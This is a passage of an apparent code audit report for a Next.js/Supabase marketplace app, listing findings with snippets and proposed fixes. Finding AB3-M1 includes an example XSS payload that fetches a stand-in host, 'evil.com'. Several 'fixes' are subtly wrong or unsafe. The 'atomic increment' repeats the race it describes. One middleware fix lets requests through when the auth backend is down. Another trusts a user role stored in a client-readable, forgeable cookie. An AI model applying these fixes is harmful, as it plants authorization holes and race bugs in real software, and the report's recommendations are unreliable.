const roleRaw = new URL(req.url).searchParams.get('role') ?? 'buyer'
if (!['buyer', 'vendor'].includes(roleRaw)) {
 return NextResponse.json({ error: 'Invalid role parameter' }, { status: 400 })
}
const role = roleRaw
```

---

### AB3-H9 — Refund Notification Sent to Buyer Instead of Vendor

**Status:** OPEN
**File:** `src/app/api/webhooks/razorpay/route.ts:183`

**Issue:** `user_id: booking.buyer_id` sends the refund notification to the buyer, but the buyer is the one whose payment was refunded. The vendor (who receives the money) is not notified.

```typescript
await supabase.from('notifications').insert({
 user_id: booking.buyer_id,  // ← wrong recipient
 type: 'refund_initiated',
})
```

**Fix:** Send to vendor:
```typescript
user_id: booking.vendor_id,
```

---

### AB3-H10 — `errorDesc` Variable Shadowing in Payment Failed Handler

**Status:** OPEN
**File:** `src/app/api/webhooks/razorpay/route.ts:120-129`

**Issue:** The notification uses `errorDesc` (from the outer scope Supabase result) instead of the Razorpay `error_description` field. `errorDesc` is always `undefined` inside this notification callback, so the failure reason is never shown to the user.

```typescript
body: `...failed: ${errorDesc ?? errorCode ?? 'Unknown error'}.`
// errorDesc is undefined (it was from the update result, not Razorpay payload)
```

**Fix:** Use the Razorpay payload field directly:
```typescript
body: `...failed: ${event.payload.payment?.entity?.error_description ?? errorCode ?? 'Unknown error'}.`
```

---

### AB3-M1 — Email Templates Interpolate Unsanitized User Data — XSS Risk

**Status:** OPEN
**File:** `src/lib/email.ts:45-54`

**Issue:** All email template functions use template literals with raw user data interpolation. A malicious vendor name like `<script>fetch('evil.com')</script>` is embedded directly into HTML email bodies, risking XSS if the email client renders HTML.

```typescript
html: `<p><strong>${opts.vendorName}</strong> has sent you a quote...`
// opts.vendorName rendered without escaping
```

**Fix:** Use a templating library with auto-escaping (handlebars, nunjucks), or escape user data:
```typescript
import DOMPurify from 'isomorphic-dompurify'
const safeVendorName = DOMPurify.sanitize(opts.vendorName, { ALLOWED_TAGS: [] })
```

---

### AB3-M2 — `sendEmail` Swallows Failures Silently

**Status:** OPEN
**File:** `src/lib/email.ts:28-31`

**Issue:** When `sendEmail` fails, it logs the error and returns normally. Callers cannot tell if an email was sent successfully.

```typescript
if (!res.ok) {
 const err = await res.text()
 console.error('[email] send failed:', err)
 // ← no throw, no return indicating failure
}
```

**Fix:** Throw on failure or return a typed result:
```typescript
if (!res.ok) {
 const err = await res.text()
 console.error('[email] send failed:', err)
 throw new Error(`Email send failed: ${err}`)
}
```

---

### AB3-M3 — Middleware Supabase Fetch Blocks All Requests on Transient Errors

**Status:** FIXED (2026-04-17)
**File:** `src/middleware.ts:78-80`

**Issue:** Any network error hitting Supabase REST API for role lookup redirects every authenticated user to `/login`. Even a 30-second Supabase outage locks all users out of the entire app.

```typescript
} catch {
 // Supabase error — can't verify role, deny access to ALL protected routes
 return NextResponse.redirect(new URL('/login', req.url))
}
```

**Fix:** Distinguish network errors from auth errors:
```typescript
} catch (e) {
 const isNetworkError = e instanceof TypeError || e?.cause?.code === 'ENOTFOUND'
 if (isNetworkError) {
 // Allow access temporarily — log for monitoring
 console.error('[middleware] Supabase unreachable, allowing request:', req.url)
 return NextResponse.next()
 }
 return NextResponse.redirect(new URL('/login', req.url))
}
```

---

### AB3-M4 — Middleware Fetches User Role on Every Request — No Caching

**Status:** OPEN
**File:** `src/middleware.ts:57-81`

**Issue:** Every authenticated page navigation triggers a Supabase REST API call to fetch the user's role. With 100 concurrent users, that's 100 extra DB queries per page load.

```typescript
const rolesRes = await fetch(
 `${supabaseUrl}/rest/v1/users?select=role&id=eq.${userId}`, ...
)
// ← No caching. Every request.
```

**Fix:** Store role in a short-lived cookie after first fetch, or include role in the JWT:
```typescript
// After first role fetch, set a cookie
response.cookies.set('user_role', userRole, { maxAge: 300, httpOnly: false })
// On subsequent requests, read from cookie first
```

---

### AB3-M5 — Logout Doesn't Clear Auth Cookies Server-Side

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/auth/logout/route.ts`

**Issue:** `signOut()` invalidates the session server-side, but the Supabase auth cookies remain in the browser until they expire naturally. A stolen cookie remains valid until its TTL.

```typescript
const { error } = await supabase.auth.signOut()
return NextResponse.json({ success: true })
// ← Cookies still set in browser
```

**Fix:** Explicitly clear cookies:
```typescript
const response = NextResponse.json({ success: true })
const cookies = ['sb-access-token', 'sb-refresh-token', 'auth-token']
cookies.forEach(name => {
 response.cookies.set(name, '', { maxAge: 0, path: '/' })
})
return response
```

---

### AB3-M6 — Notifications PATCH Marks ALL as Read — No Selective Scope

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/notifications/route.ts:39-50`

**Issue:** `PATCH` with no params marks every notification as read. There's no way to mark only unread ones, or only notifications older than a timestamp. A second rapid call has no effect (already all read) but a caller has no control.

```typescript
await supabase.update({ read_at: new Date().toISOString() })
 .eq('user_id', user.id)
 .is('read_at', null)
// ← All unread marked as read. No granularity.
```

**Fix:** Accept optional query params for scoping:
```typescript
const before = searchParams.get('before') // ISO timestamp
let query = supabase.update({ read_at: now }).eq('user_id', user.id).is('read_at', null)
if (before) query = query.lte('created_at', before)
const { error } = await query
```

---

### AB3-M7 — QR Scan `.single()` Throws on Multiple Rows

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/qr/scan/[slug]/route.ts:36`

**Issue:** `.single()` throws a `MultipleRowsError` if the slug query matches more than one active QR code. If a slug collision exists in the database, every scan for that slug crashes with a 500.

```typescript
.eq('qr_slug', slug).eq('is_active', true).single()
// ← Throws if 2+ rows match
```

**Fix:** Use `.maybeSingle()` and handle the null case:
```typescript
const { data: qr } = await supabase.from('qr_codes')
 .select('*').eq('qr_slug', slug).eq('is_active', true).maybeSingle()
if (!qr) {
 return NextResponse.json({ error: 'QR code not found' }, { status: 404 })
}
```

---

### AB3-M8 — QR Slug Insert Fails Silently → Subsequent Query Excludes Nothing

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/qr/scan/[slug]/route.ts:99`

**Issue:** If the `scan_events` insert fails and returns null, `scanEvent?.id ?? ''` evaluates to `''`. The subsequent `neq('id', '')` query matches all rows — `priorScans` becomes artificially inflated, defeating the unique-scanner logic.

```typescript
.neq('id', scanEvent?.id ?? '')
// ← If scanEvent is null, this is .neq('id', '') — excludes nothing
```

**Fix:** Guard against null:
```typescript
if (!scanEvent) {
 return NextResponse.redirect(`${appUrl}/scan/${slug}?coins=0&reason=insert_failed`)
}
.neq('id', scanEvent.id)
```

---

### AB3-M9 — Vendor Analytics Uses Both `createClient` and `createServerClient`

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/vendor/analytics/route.ts:5`

**Issue:** Both Supabase clients are imported. The analytics endpoint uses the raw `createClient` with manual auth header injection instead of `createServerClient`. This bypasses the centralized server client configuration.

```typescript
import { createClient } from '@supabase/supabase-js'
import { createServerClient } from '@/lib/supabase'
// ← Raw createClient used alongside createServerClient
```

**Fix:** Use only `createServerClient` consistently throughout the codebase.

---

### AB3-M10 — Refund Record Insert Not Awaited — False Success Signal

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/webhooks/razorpay/route.ts:164-173`

**Issue:** `handleRefundCreated` inserts a refund record inside a try/catch, but the catch returns `{ updated: 0 }` without setting an error flag. The function returns `updated: 1` even when the refund record insert failed — caller thinks the refund was recorded when it wasn't.

```typescript
try {
 await supabase.from('refunds').insert({...})
} catch (e) {
 console.error('refund insert failed:', e)
 // ← Returns normally, outer scope returns { updated: 1 }
}
return { updated: data ? 1 : 0 }  // ← Could be 1 even with failed insert
```

**Fix:** Add a flag:
```typescript
let refundSaved = false
try {
 await supabase.from('refunds').insert({...})
 refundSaved = true
} catch (e) {
 console.error('refund insert failed:', e)
}
return { updated: refundSaved ? 1 : 0 }
```

---

### AB3-M11 — Profile GET/PATCH Have No try/catch

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/profile/route.ts:24-31, 35-65`

**Issue:** Both GET and PATCH handlers have zero try/catch. Any Supabase network error, RLS policy violation, or unexpected exception propagates as an unhandled 500 with no logging and no graceful degradation.

**Fix:** Wrap each handler body in try/catch:
```typescript
export async function PATCH(req: NextRequest) {
 try {
 const user = await authenticate(req)
 if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
 // ... handler body
 } catch (e) {
 console.error('[profile PATCH error]:', e)
 return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
 }
}
```

---

### AB3-M12 — `unique_scanners` Counts Null User IDs as Separate Scanners

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/bookings/[id]/route.ts:67-71`

**Issue:** `(user_id ?? id)` counts a scan with `null` user_id as its own unique scanner, inflating the unique count by 1 for every anonymous scan.

```typescript
scanStats.unique_scanners = new Set(scans.map(s => s.user_id ?? s.id)).size
// ↑ null user_id → counted as unique scanner
```

**Fix:** Exclude null user IDs:
```typescript
scanStats.unique_scanners = new Set(
 scans.map(s => s.user_id).filter(Boolean)
).size
```

---

### AB3-M13 — Bookings Foreign Key Constraint Names Are Environment-Specific

**Status:** OPEN
**File:** `src/app/api/bookings/route.ts:276-283`

**Issue:** Join constraint names like `!bookings_vendor_id_fkey` are used, but these names can differ between Supabase instances. If the constraint name is wrong, the query silently returns no join data with no error.

```typescript
vendor:users!bookings_vendor_id_fkey(name),
buyer:users!bookings_buyer_id_fkey(name),
// ↑ These constraint names are environment-specific
```

**Fix:** Use column-based joins instead of constraint-based:
```typescript
vendor:users!vendor_id(name),
buyer:users!buyer_id(name),
```

---

### AB3-M14 — Listing View Count Race Condition — Read-Then-Write

**Status:** OPEN
**File:** `src/app/api/listings/[id]/view/route.ts:17-33`

**Issue:** Two concurrent requests both read `view_count = 5`, both compute `5 + 1 = 6`, both write `6`. Count increases by 1 instead of 2.

```typescript
const { data } = await supabase.from('listings').select('view_count').eq('id', id).single()
// ← Request A reads 5, Request B reads 5
await supabase.update({ view_count: (data.view_count ?? 0) + 1 }).eq('id', id)
// ← Request A writes 6, Request B writes 6
```

**Fix:** Use atomic increment:
```typescript
await supabase.from('listings')
 .update({ view_count: (data.view_count ?? 0) + 1 })
 .eq('id', id)
// Or better: use Supabase RPC with SQL: UPDATE listings SET view_count = view_count + 1
```

---

### AB3-L1 — Logout `signOut` Error Swallowed — Client Can't Distinguish Success/Failure

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/auth/logout/route.ts:8-10`

**Issue:** Even when `signOut()` fails, the response is `{ success: true }`. The client cannot detect logout failure.

```typescript
if (error) {
 console.error('[Logout] signOut error:', error.message)
}
// ← Still returns { success: true }
```

**Fix:** Return error to client:
```typescript
if (error) {
 return NextResponse.json({ success: false, error: error.message }, { status: 500 })
}
```

---

### AB3-L2 — Inquiry Message Has No Length Validation

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/inquiries/route.ts:22-23`

**Issue:** `message` field has no length check. A 100KB message could cause DB issues or be used for abuse.

```typescript
const { listingId, message, budget, startDate, endDate, requirements } = body
// ← No length validation
```

**Fix:** Add length limit:
```typescript
if (message && message.length > 5000) {
 return NextResponse.json({ error: 'Message exceeds maximum length of 5000 characters' }, { status: 400 })
}
```

---

### AB3-L3 — `verifyOwnership` Swallows Supabase Errors Silently

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/vendor/listings/[id]/route.ts:27-32`

**Issue:** The ownership check returns `false` for all errors, including network failures and RLS denials. A network error looks identical to a non-owner, masking infrastructure problems.

```typescript
const { data } = await supabase.from('listings').select('vendor_id').eq('id', listingId).single()
return data?.vendor_id === vendorId
// ← If Supabase errors, data is null → returns false (not-owner response)
```

**Fix:** Log and rethrow Supabase errors:
```typescript
if (error) {
 console.error('[verifyOwnership error]:', error)
 throw new Error('Failed to verify listing ownership')
}
return data?.vendor_id === vendorId
```

---

## Summary (Combined Rounds 2 + 3)

| Round | CRITICAL | HIGH | MEDIUM | LOW | Total |
|-------|----------|------|--------|-----|-------|
| Round 2 (2026-04-17) | 6 | 10 | 19 | 5 | **40** |
| Round 3 (2026-04-17) | 4 | 10 | 14 | 3 | **31** |
| **Combined Total** | **10** | **20** | **33** | **8** | **71** |

**Combined with Round 1 (original audit):** 40 + 71 = **111 total issues in AdBazaar**

---

## Cross-Reference to Existing Audit

| New Issue | Overlaps With |
|-----------|--------------|
| AB2-H2 | AB-C2 (rate limiting) |
| AB2-H3 | AB-C2 (rate limiting) |
| AB2-H8 | AB-H3 (admin auth fragile) |
| AB2-H8 | AB-H3 (admin auth fragile) |
| AB2-C3 | AB-H1 (createServerClient fallback) |
| AB2-M8 | AB-H2 (admin cookie parsing) |
| AB2-H7 | AB-C4 (idempotency on booking) |

---

**Last Updated:** 2026-04-17
